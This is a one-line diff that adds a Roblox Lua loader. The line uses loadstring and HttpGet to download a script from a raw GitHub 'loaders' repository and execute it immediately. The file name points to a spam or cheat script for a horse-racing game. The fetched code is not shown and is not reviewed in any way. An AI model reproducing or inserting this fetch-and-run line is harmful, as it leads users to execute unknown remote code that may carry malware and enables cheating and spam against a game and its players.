@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/catastrophic-horse-racing-spam3-kfhxfzp3obh96l.lua"))()
